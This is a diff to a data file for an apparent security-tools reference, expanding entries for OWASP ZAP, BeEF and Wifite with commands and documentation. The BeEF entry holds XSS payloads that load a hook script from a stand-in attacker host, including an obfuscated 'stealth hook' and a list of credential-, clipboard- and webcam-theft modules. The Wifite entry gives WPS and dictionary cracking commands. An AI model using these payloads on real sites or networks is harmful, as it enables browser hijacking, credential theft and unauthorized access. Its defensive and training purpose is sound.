@@ -496,8 +496,32 @@ export const toolsCategories: ToolCategory[] = [
         usage: "OWASP ZAP is used as both an automated scanner and manual testing tool for web application security assessments",
         examples: [
           {
-            title: "Start ZAP",
+            title: "Start ZAP GUI",
             code: "zaproxy"
+          },
+          {
+            title: "Start ZAP headless (daemon mode)",
+            code: "zap.sh -daemon -port 8080 -config api.disablekey=true"
+          },
+          {
+            title: "Quick baseline scan",
+            code: "zap-baseline.py -t http://example.com"
+          },
+          {
+            title: "Full scan with report",
+            code: "zap-full-scan.py -t http://example.com -r report.html"
+          },
+          {
+            title: "API scan",
+            code: "zap-api-scan.py -t http://example.com/api/openapi.json -f openapi"
+          },
+          {
+            title: "Spider a website",
+            code: "zap-cli spider http://example.com"
+          },
+          {
+            title: "Active scan",
+            code: "zap-cli active-scan http://example.com"
           },
           {
             title: "Quick scan from command line",
@@ -506,9 +530,21 @@ export const toolsCategories: ToolCategory[] = [
           {
             title: "Generate HTML report",
             code: "zap-cli report -o report.html -f html"
+          },
+          {
+            title: "Scan with authentication",
+            code: "zap-cli --zap-url http://localhost:8080 open-url http://example.com/login"
+          },
+          {
+            title: "Export alerts to JSON",
+            code: "zap-cli alerts -f json -o alerts.json"
+          },
+          {
+            title: "Docker automated scan",
+            code: "docker run -t owasp/zap2docker-stable zap-baseline.py -t https://example.com"
           }
         ],
-        documentation: "OWASP ZAP (Zed Attack Proxy) is a free, open-source penetration testing tool being maintained under the Open Web Application Security Project (OWASP). ZAP is designed specifically for testing web applications and is both flexible and extensible.",
+        documentation: "OWASP ZAP (Zed Attack Proxy) is the world's most popular free web application security scanner. Maintained by hundreds of volunteers under OWASP, it's designed for both beginners and professional penetration testers. With automated scanners and manual testing tools, ZAP helps find security vulnerabilities in web applications during development and testing.\\n\\nCore Components:\\n• Proxy: Intercept and modify HTTP/HTTPS traffic\\n• Spider: Automatically discover application content and functionality\\n• Scanner: Automated vulnerability detection (active and passive)\\n• Fuzzer: Send malicious payloads to test application resilience\\n• Authentication: Session management and authentication testing\\n• API: Extensive REST API for automation\\n• Add-ons: Extensible marketplace with 100+ plugins\\n\\nScanning Modes:\\n• Passive Scanning: Analyze responses without sending attacks\\n  • No risk to target application\\n  • Detects: Missing headers, information disclosure, cookies\\n  • Always running in background\\n• Active Scanning: Send attack payloads\\n  • Tests for: SQLi, XSS, XXE, SSRF, command injection\\n  • Configurable attack strength\\n  • Can impact application performance\\n• Traditional Spider: HTML-based crawling\\n• Ajax Spider: JavaScript-aware crawling\\n\\nAutomated Scan Scripts:\\n• Baseline Scan: Quick vulnerability check (10-15 mins)\\n  • Passive scanning only\\n  • Spider + passive rules\\n  • CI/CD integration ready\\n• Full Scan: Comprehensive testing (hours)\\n  • Spider + active + passive\\n  • All attack categories\\n  • Detailed reports\\n• API Scan: OpenAPI/SOAP testing\\n  • Import API definitions\\n  • Automatic endpoint testing\\n  • REST/GraphQL support\\n\\nAuthentication Support:\\n• Form-Based: Auto-detect login forms\\n• Script-Based: Custom authentication scripts\\n• HTTP/NTLM: Basic and NTLM auth\\n• OAuth: OAuth 2.0 support\\n• Session Management: Maintain authenticated state\\n• Anti-CSRF Tokens: Automatic token handling\\n\\nVulnerability Detection:\\n• Injection Flaws:\\n  • SQL Injection (Error, Boolean, Time-based)\\n  • XSS (Reflected, Stored, DOM)\\n  • Command Injection\\n  • LDAP/XPath Injection\\n  • XXE (XML External Entity)\\n• Broken Authentication:\\n  • Weak passwords\\n  • Session fixation\\n  • Insecure session management\\n• Sensitive Data Exposure:\\n  • Unencrypted transmission\\n  • Weak encryption\\n  • Information disclosure\\n• Security Misconfiguration:\\n  • Missing security headers\\n  • Default credentials\\n  • Directory listing\\n  • Unnecessary HTTP methods\\n• Access Control:\\n  • Path traversal\\n  • Privilege escalation\\n  • IDOR (Insecure Direct Object Reference)\\n\\nZAP API:\\n• REST API: Full control via HTTP\\n• Languages: Python, Java, Node.js, PHP clients\\n• Operations: Scan, spider, alerts, authentication\\n• Automation: CI/CD pipeline integration\\n• Port: Default 8080\\n• API Key: Security for remote access\\n\\nDocker Integration:\\n• Official Images: owasp/zap2docker-stable, weekly\\n• Automated Scanning: No GUI required\\n• CI/CD: Jenkins, GitLab CI, GitHub Actions\\n• Scan Types: Baseline, full, API scans\\n• Volume Mounting: Save reports externally\\n\\nAdd-ons and Extensions:\\n• Active Scan Rules: Additional vulnerability checks\\n• Passive Scan Rules: More security checks\\n• Technology Detection: Wappalyzer integration\\n• Report Generation: Multiple formats\\n• Authentication: Advanced auth helpers\\n• Fuzzing: Custom fuzzing dictionaries\\n• API: GraphQL, WebSocket support\\n• Import/Export: Burp, Postman, OpenAPI\\n\\nReporting:\\n• Formats: HTML, XML, JSON, Markdown\\n• Risk Levels: High, Medium, Low, Informational\\n• Confidence: High, Medium, Low, Falsepositive\\n• Details: Description, solution, references\\n• Customization: Template customization\\n• Export: Multiple vulnerabilities grouped\\n\\nContext Management:\\n• Define Scope: Include/exclude URLs\\n• Technology: Set technology stack\\n• Authentication: Per-context auth config\\n• Session Management: Context-specific sessions\\n• Users: Multiple user testing\\n• Access Control: Permission testing\\n\\nFuzzing Capabilities:\\n• Fuzzer Tool: Manual fuzzing interface\\n• Payloads: Built-in fuzz files\\n• Custom: Add your own payloads\\n• Processors: Encode, hash, script\\n• Analysis: Detect anomalies in responses\\n• Categories: XSS, SQLi, Command injection\\n\\nCI/CD Integration:\\n• Jenkins: ZAP Plugin available\\n• GitLab CI: Docker-based scanning\\n• GitHub Actions: Automated PR scanning\\n• Azure DevOps: Pipeline integration\\n• Bamboo: Build integration\\n• Break Build: Fail on high-risk findings\\n\\nBest Practices:\\n• Start with baseline scans in dev\\n• Use contexts to define scope\\n• Configure authentication properly\\n• Review false positives\\n• Tune scanner for application type\\n• Use both traditional and Ajax spiders\\n• Monitor scan progress and logs\\n• Save session files regularly\\n• Update add-ons frequently\\n• Test in non-production first\\n\\nPerformance Tuning:\\n• Thread Count: Adjust for target capacity\\n• Delays: Add delays to avoid overload\\n• Policy: Choose appropriate scan policy\\n• Exclusions: Exclude logout, destructive operations\\n• Memory: Increase Java heap size\\n• Ajax Spider: Limit max duration\\n\\nCommon Use Cases:\\n• SDLC Integration: Security in development\\n• Penetration Testing: Manual and automated testing\\n• Compliance: OWASP Top 10, PCI DSS validation\\n• Security Regression: Automated security tests\\n• API Security: RESTful API testing\\n• Training: Learn web security concepts\\n• Bug Bounty: Quick vulnerability discovery\\n\\nIntegration:\\n• Burp Suite: Import/export site trees\\n• Selenium: Browser automation testing\\n• Postman: Import API collections\\n• Nmap: Combine with port scanning\\n• Metasploit: Vulnerability to exploitation\\n• SIEM: Export findings for correlation\\n\\nLimitations:\\n• False Positives: Requires manual verification\\n• JavaScript: Limited compared to manual testing\\n• Business Logic: Cannot detect logic flaws\\n• Modern Frameworks: React/Vue detection challenges\\n• Performance: Can slow down applications\\n• Complex Auth: May need custom scripts\\n\\nReal-World Applications:\\n• DevSecOps: Shift-left security testing\\n• Continuous Security: Automated pipeline checks\\n• Compliance Audits: Validate security controls\\n• Pre-Production: Catch issues before deployment\\n• Regression Testing: Ensure fixes don't break security\\n• Security Training: Hands-on learning tool\\n• Bug Bounty: Initial reconnaissance and testing\\n• Client Demos: Show vulnerabilities to stakeholders",
         githubUrl: "https://github.com/zaproxy/zaproxy",
         tags: ["web", "proxy", "scanner", "OWASP", "penetration testing"]
       }
@@ -851,19 +887,47 @@ export const toolsCategories: ToolCategory[] = [
         usage: "BeEF is used to assess a target's security by focusing on the web browser attack vector",
         examples: [
           {
-            title: "Start BeEF",
+            title: "Start BeEF server",
             code: "sudo beef-xss"
-          },
-          {
-            title: "Hook browser with JavaScript",
-            code: "<script src=\"http://attacker-ip:3000/hook.js\"></script>"
           },
           {
             title: "Access control panel",
             code: "http://127.0.0.1:3000/ui/panel"
+          },
+          {
+            title: "Basic hook script (inject in target page)",
+            code: "<script src=\"http://attacker-ip:3000/hook.js\"></script>"
+          },
+          {
+            title: "Stealth hook (minimal code)",
+            code: "<script src=\"http://bit.ly/shortened-hook\"></script>"
+          },
+          {
+            title: "Hook via XSS payload",
+            code: "\"><script src=http://attackerip:3000/hook.js></script>"
+          },
+          {
+            title: "Start with custom config",
+            code: "beef-xss -c /path/to/config.yaml"
+          },
+          {
+            title: "Import third-party extensions",
+            code: "# Place extensions in ~/.beef/extensions/"
+          },
+          {
+            title: "Use RESTful API",
+            code: "curl -H 'Content-Type: application/json' -d '{\"username\":\"beef\",\"password\":\"beef\"}' http://127.0.0.1:3000/api/admin/login"
+          },
+          {
+            title: "Enable metasploit integration",
+            code: "# Set metasploit: {enable: true} in config.yaml"
+          },
+          {
+            title: "Command execution via API",
+            code: "curl -H 'Content-Type: application/json' -X POST -d '{\"command\":\"alert\",\"params\":{\"text\":\"Hooked!\"}}' http://127.0.0.1:3000/api/hooks/[session]/execute"
           }
         ],
-        documentation: "BeEF (Browser Exploitation Framework) is a penetration testing tool focusing on web browsers. It allows the penetration tester to assess the actual security posture of a target environment by using client-side attack vectors.",
+        documentation: "BeEF (Browser Exploitation Framework) is a powerful penetration testing tool that focuses on exploiting web browser vulnerabilities. Developed by Wade Alcorn and maintained by the BeEF Project, it demonstrates the impact of browser-based attacks and allows security professionals to assess client-side security posture.\\n\\nCore Concepts:\\n• Hook: JavaScript injected into target browser\\n• Hooked Browser: Victim browser running BeEF hook\\n• Zombie: Compromised browser under attacker control\\n• Command Modules: Attack payloads executed on zombies\\n• Web GUI: Control panel for managing attacks\\n• RESTful API: Programmatic control\\n\\nArchitecture:\\n• Communication Server: Manages hooked browsers\\n• Web Interface: User-friendly control panel (port 3000)\\n• Hook Handler: JavaScript communications\\n• Command Modules: 300+ attack modules\\n• Extension System: Custom functionality\\n• Database: SQLite for session storage\\n• API: RESTful endpoints for automation\\n\\nHooking Methods:\\n• Reflected XSS: Inject hook via vulnerable parameter\\n• Stored XSS: Persistent hook in database\\n• DOM XSS: Client-side injection\\n• MITM: Inject hook via network interception\\n• Social Engineering: Trick user to visit page\\n• Physical Access: Modify local files\\n• Content Injection: Ads, widgets, comments\\n• DNS Hijacking: Redirect to hooked page\\n\\nCommand Modules (Categories):\\n• Browser:\\n  • Hooked Domain: Information gathering\\n  • Webcam: Capture photos\\n  • Geolocation: Get physical location\\n  • Detect Software: Installed plugins\\n• Chrome Extensions:\\n  • Hijack Gmail sessions\\n  • Steal credentials\\n  • Monitor activity\\n• Exploits:\\n  • Browser exploits (CVEs)\\n  • Plugin vulnerabilities\\n  • ActiveX attacks\\n• Host:\\n  • Detect OS, architecture\\n  • Local network scanning\\n  • Port scanning\\n• Network:\\n  • Fingerprint services\\n  • DNS enumeration\\n  • Cross-protocol attacks\\n• Persistence:\\n  • Confirm close popup\\n  • Man-in-the-browser\\n  • iFrame persistence\\n• Phonegap:\\n  • Mobile app attacks\\n  • Device information\\n• Social Engineering:\\n  • Fake notification bar\\n  • Clipboard theft\\n  • Pretty Theft (credential harvesting)\\n  • TabNabbing\\n\\nModule Status Indicators:\\n• Green: Module works on target\\n• Orange: May work, user interaction needed\\n• Grey: Won't work on target\\n• Red: Module failed\\n\\nCommand Module Examples:\\n• Get Clipboard: Steal copied content\\n• Pretty Theft: Fake login prompts\\n• Webcam: Capture images via getUserMedia\\n• Geolocation: HTML5 geolocation API\\n• Browser Fingerprint: Detailed browser info\\n• Network Discovery: Scan internal network\\n• Port Scanner: Identify open ports\\n• Social Engineering: Fake update prompts\\n• Raw JavaScript: Custom code execution\\n\\nMetasploit Integration:\\n• Proxy Pivot: Route Metasploit through BeEF\\n• Browser Autopwn: Automated exploitation\\n• Payload Delivery: Serve exploits to hooked browsers\\n• Cross-Framework: Combine web + network attacks\\n• Configuration: Enable in config.yaml\\n• Handlers: Automatic exploit serving\\n\\nRESTful API:\\n• Authentication: Token-based\\n• Endpoints:\\n  • /api/admin/login: Authentication\\n  • /api/hooks: List hooked browsers\\n  • /api/hooks/[session]: Session details\\n  • /api/modules: Available modules\\n  • /api/hooks/[session]/execute: Run commands\\n• Automation: Scripted attacks\\n• Integration: SIEM, custom tools\\n\\nPersistence Techniques:\\n• Popup on Close: Warn user before leaving\\n• iFrame Embedding: Hidden persistent frame\\n• Man-in-the-Browser: Intercept all requests\\n• Service Worker: Background JavaScript\\n• WebRTC Persistence: Maintain connection\\n• Confirm Navigation: Block page leave\\n\\nInformation Gathering:\\n• Browser Details: Type, version, plugins\\n• Operating System: Platform detection\\n• Network Info: Internal IP, hostname\\n• Location: GPS coordinates\\n• Screen Resolution: Display info\\n• Cookies: Session tokens\\n• Browser History: Visited sites\\n• Social Media: Detect logged-in accounts\\n\\nSocial Engineering Modules:\\n• Pretty Theft: Fake login boxes (Facebook, Gmail, etc.)\\n• TabNabbing: Change inactive tabs\\n• Clipboard Hijack: Steal/modify clipboard\\n• Fake Flash Update: Malware download prompts\\n• Notification Bar: Fake browser notifications\\n• Fake Plugin Update: Trick user installs\\n\\nAdvanced Attacks:\\n• Cross-Protocol Attacks: HTTP to internal services\\n• DNS Rebinding: Bypass same-origin policy\\n• CORS Exploitation: Cross-origin requests\\n• WebRTC Leaks: Reveal real IP\\n• Browser Autopwn: Automated exploitation\\n• Tunneling: Proxy through hooked browser\\n• Inter-Protocol Exploitation: Attack protocols via browser\\n\\nConfiguration (config.yaml):\\n• Server Settings: IP, ports, SSL\\n• Authentication: Change default credentials\\n• Extension Enable/Disable: Module control\\n• Database: SQLite path\\n• Autorun: Modules on hook\\n• Console Logs: Logging level\\n• Web Server: Custom web root\\n\\nWeb Interface Features:\\n• Dashboard: Overview of hooked browsers\\n• Online Browsers: Real-time zombie list\\n• Module Execution: Run commands\\n• Command Results: View output\\n• Logs: Activity tracking\\n• Event Notifications: Real-time alerts\\n• Browser Details: Detailed information\\n• Multi-Select: Command multiple zombies\\n\\nExtensions:\\n• Custom Modules: Add new functionality\\n• Third-Party: Community extensions\\n• Location: ~/.beef/extensions/\\n• Development: Ruby/JavaScript\\n• API Integration: External service hooks\\n\\nDefense Against BeEF:\\n• Content Security Policy (CSP): Restrict script sources\\n• X-Frame-Options: Prevent iframe embedding\\n• Input Validation: Prevent XSS\\n• HTTPOnly Cookies: Protect session tokens\\n• Subresource Integrity: Verify script integrity\\n• HTTPS Only: Prevent MITM injection\\n• Security Headers: HSTS, X-Content-Type\\n• Browser Extensions: NoScript, uBlock Origin\\n\\nBest Practices:\\n• Authorization: Only test authorized applications\\n• Lab Environment: Practice safely\\n• Change Defaults: Update default credentials\\n• HTTPS: Use SSL for hook delivery\\n• Obfuscation: Hide hook.js URL\\n• Target Reconnaissance: Know target first\\n• Module Selection: Choose appropriate attacks\\n• Document Findings: Record all activities\\n• Clean Up: Remove hooks after testing\\n\\nLimitations:\\n• Requires XSS: Need injection point\\n• Same-Origin: Limited by browser policy\\n• Browser Compatibility: Some modules browser-specific\\n• Active Connection: Needs persistent connection\\n• Detection: Network monitoring can spot it\\n• Modern Browsers: Security features limit attacks\\n\\nReal-World Applications:\\n• Penetration Testing: Demonstrate XSS impact\\n• Security Awareness: Training demonstrations\\n• Red Team: Client-side attack simulation\\n• Vulnerability Assessment: Test browser security\\n• Research: Browser security research\\n• CTF: Capture the Flag challenges\\n• Bug Bounty: Prove XSS exploitability\\n\\nIntegration:\\n• Metasploit: Browser exploitation integration\\n• Social Engineer Toolkit: Phishing campaigns\\n• Burp Suite: Find and exploit XSS\\n• OWASP ZAP: Identify injection points\\n• Custom Scripts: API automation\\n• SIEM: Log analysis and correlation\\n\\nCommon Use Cases:\\n• XSS Impact Demo: Show what attackers can do\\n• Internal Network Mapping: From hooked browser\\n• Credential Harvesting: Social engineering\\n• Session Hijacking: Steal authentication tokens\\n• Phishing: Combined attacks\\n• Malware Delivery: Drive-by downloads\\n• Browser Fingerprinting: Identify users\\n\\nLegal and Ethical:\\n• Authorization: Written permission required\\n• Scope: Stay within authorized targets\\n• No Malicious Use: Educational/testing only\\n• Data Protection: Handle captured data securely\\n• Compliance: Follow laws (CFAA, GDPR)\\n• Responsible Disclosure: Report findings properly\\n• Impact: Minimize disruption",
         githubUrl: "https://github.com/beefproject/beef",
         tags: ["browser", "exploitation", "XSS", "client-side", "hook"]
       }
@@ -974,15 +1038,51 @@ export const toolsCategories: ToolCategory[] = [
             code: "sudo wifite"
           },
           {
-            title: "Target specific encryption",
+            title: "Target WPA networks only",
             code: "sudo wifite --wpa"
           },
           {
-            title: "Specify a wordlist",
-            code: "sudo wifite --dict /path/to/wordlist.txt"
+            title: "Target WEP networks only",
+            code: "sudo wifite --wep"
+          },
+          {
+            title: "Target WPS networks",
+            code: "sudo wifite --wps"
+          },
+          {
+            title: "Specify custom wordlist",
+            code: "sudo wifite --dict /usr/share/wordlists/rockyou.txt"
+          },
+          {
+            title: "Kill all interfering processes",
+            code: "sudo wifite --kill"
+          },
+          {
+            title: "Target specific network by BSSID",
+            code: "sudo wifite -b AA:BB:CC:DD:EE:FF"
+          },
+          {
+            title: "Set specific wireless interface",
+            code: "sudo wifite -i wlan0"
+          },
+          {
+            title: "Limit attack time per network",
+            code: "sudo wifite --wpa --crack-timeout 60"
+          },
+          {
+            title: "Filter by signal strength",
+            code: "sudo wifite --pow 40"
+          },
+          {
+            title: "Reaver WPS attack with timeout",
+            code: "sudo wifite --wps --pixie --timeout 300"
+          },
+          {
+            title: "Skip already cracked networks",
+            code: "sudo wifite --skip-crack"
           }
         ],
-        documentation: "Wifite is designed to attack multiple WEP, WPA, and WPS encrypted networks in a row, making it a great tool for penetration testers who want to test the security of several networks quickly. It automates the wireless attack process and can be more user-friendly for beginners than using the aircrack-ng suite directly.",
+        documentation: "Wifite2 is a Python-based automated wireless network auditing tool designed to streamline WiFi security testing. Created by derv82 and rewritten for Python 3, it's a wrapper around industry-standard tools (Aircrack-ng, Reaver, Bully) that simplifies wireless penetration testing with an intuitive menu-driven interface.\\n\\nCore Features:\\n• Automated Attacks: All-in-one wireless testing\\n• Multiple Encryption: WEP, WPA/WPA2-PSK, WPS support\\n• Smart Targeting: Automatic network selection\\n• Parallel Processing: Attack multiple targets\\n• Session Resumption: Continue interrupted attacks\\n• Minimal User Input: Mostly automated workflow\\n• Color-Coded Output: Easy status visualization\\n• Wordlist Support: Custom dictionary attacks\\n\\nSupported Attack Types:\\n• WPA/WPA2-PSK:\\n  • Handshake capture via deauth\\n  • Dictionary attack with aircrack-ng\\n  • Hashcat format export\\n  • PMKID attack (clientless)\\n• WEP:\\n  • Fragmentation attack\\n  • Chopchop attack\\n  • ARP replay attack\\n  • P0841 attack\\n  • Caffe Latte attack\\n• WPS:\\n  • Pixie Dust attack (fast)\\n  • Reaver brute force\\n  • Bully alternative\\n  • PIN checksum validation\\n\\nDependencies:\\n• Required: Aircrack-ng suite\\n• WPA: aircrack-ng (always available)\\n• WPS: Reaver or Bully\\n• Advanced: hcxdumptool, hcxpcapngtool (PMKID)\\n• Optional: Cowpatty, Pyrit (WPA acceleration)\\n• Monitor Mode: Compatible wireless card\\n\\nWorkflow:\\n1. Interface Setup: Auto-enable monitor mode\\n2. Network Discovery: Scan for targets\\n3. Target Selection: User chooses networks\\n4. Attack Execution: Automated attack chain\\n5. Credential Recovery: Dictionary or brute force\\n6. Results Saving: Store cracked passwords\\n\\nTarget Filtering:\\n• Encryption: --wep, --wpa, --wps\\n• Signal Strength: --pow N (minimum dBm)\\n• Channel: --channel N\\n• ESSID: -e \\\"NetworkName\\\"\\n• BSSID: -b MAC_ADDRESS\\n• Manufacturer: Filter by OUI\\n• Client Count: Networks with active clients\\n\\nAttack Configuration:\\n• WPA Options:\\n  • --dict: Custom wordlist\\n  • --crack-timeout: Max attack time\\n  • --pmkid: Enable PMKID attack\\n  • --no-deauth: Skip deauth packets\\n• WEP Options:\\n  • --require-fakeauth: Fake authentication\\n  • --wep-filter: Specific WEP attacks\\n  • --pps: Packets per second\\n• WPS Options:\\n  • --pixie: Pixie Dust attack only\\n  • --ignore-locks: Ignore WPS lock\\n  • --wps-pin: Try specific PIN\\n\\nOutput and Results:\\n• Cracked Passwords: Saved to cracked.txt\\n• Handshakes: .cap files for later cracking\\n• Session Files: Resume interrupted attacks\\n• Color Coding:\\n  • Green: Success\\n  • Red: Failure\\n  • Yellow: Important info\\n  • Blue: Status updates\\n\\nPMKID Attack:\\n• Clientless: No clients needed\\n• Fast: Capture PMKID from AP\\n• Modern: Works on many routers\\n• Hashcat: Export for GPU cracking\\n• Success Rate: Higher than traditional\\n• Detection: Harder to detect\\n\\nWPS Attacks:\\n• Pixie Dust:\\n  • Exploits weak RNG\\n  • Very fast (seconds/minutes)\\n  • Works on vulnerable routers\\n  • No brute force needed\\n• PIN Brute Force:\\n  • Try all possible PINs\\n  • ~11,000 attempts\\n  • 4-10 hours typically\\n  • Rate limiting common\\n  • AP lockout risk\\n\\nAdvantages:\\n• User-Friendly: Beginner accessible\\n• Comprehensive: Multiple attack vectors\\n• Automated: Minimal manual intervention\\n• Updated: Active development\\n• Python 3: Modern codebase\\n• Cross-Platform: Linux primarily\\n• Well-Documented: Clear help system\\n\\nLimitations:\\n• Dependency Heavy: Requires many tools\\n• Limited Customization: Less control than raw tools\\n• WPA Cracking: Still requires good wordlist\\n• WPS Success: Depends on router vulnerability\\n• False Hopes: Not all networks crackable\\n• Resource Intensive: Can drain laptop battery\\n\\nBest Practices:\\n• Get Authorization: Only test your networks\\n• Strong Wordlists: Use rockyou.txt or similar\\n• Monitor Progress: Check attack status\\n• Test WPS First: Often fastest method\\n• Client Presence: WPA needs active clients (unless PMKID)\\n• Battery: Use AC power for long attacks\\n• Multiple Attempts: Some attacks need retries\\n• Update Tools: Keep dependencies current\\n• Legal Compliance: Follow local laws\\n\\nCommon Issues:\\n• No Monitor Mode: Card doesn't support\\n• Missing Dependencies: Install all tools\\n• WPS Locked: Router locked after attempts\\n• No Handshake: Deauth not effective\\n• Slow WPA: Weak CPU, use Hashcat with GPU\\n• Interface Errors: Driver compatibility\\n• Root Required: Must run as sudo\\n\\nIntegration:\\n• Hashcat: Export for GPU cracking\\n• Aircrack-ng: Underlying attack engine\\n• Reaver/Bully: WPS attack tools\\n• Hcxdumptool: PMKID capture\\n• Custom Scripts: Extend functionality\\n• Wordlist Generators: Crunch, CeWL\\n\\nReal-World Applications:\\n• Home Network Testing: Audit personal WiFi\\n• Penetration Testing: Authorized wireless audits\\n• Security Training: Learn wireless security\\n• Red Team: Initial network access\\n• Compliance: Test security controls\\n• Research: Wireless security research\\n\\nDefensive Measures:\\n• Disable WPS: Primary vulnerability\\n• Strong Passphrases: 15+ random characters\\n• WPA3: Upgrade when possible\\n• MAC Filtering: Limited effectiveness\\n• Hide SSID: Minimal protection\\n• Monitor: Detect deauth attacks\\n• 802.11w: Management frame protection\\n\\nAlternatives:\\n• Airgeddon: Similar automation\\n• Fluxion: Evil twin attacks\\n• Linset: Social engineering focus\\n• WiFi-Pumpkin: Rogue AP framework\\n• EAPHammer: WPA-Enterprise attacks\\n• Raw Aircrack-ng: Full manual control\\n\\nLegal and Ethical:\\n• Authorization Required: Written permission only\\n• Illegal Activity: Unauthorized access is a crime\\n• Federal Penalties: CFAA violations serious\\n• Responsible Use: Educational/authorized only\\n• Privacy: Respect client privacy\\n• Disclosure: Report vulnerabilities properly",
         githubUrl: "https://github.com/derv82/wifite2",
         tags: ["wireless", "automation", "WPA", "WEP", "WPS"]
       }
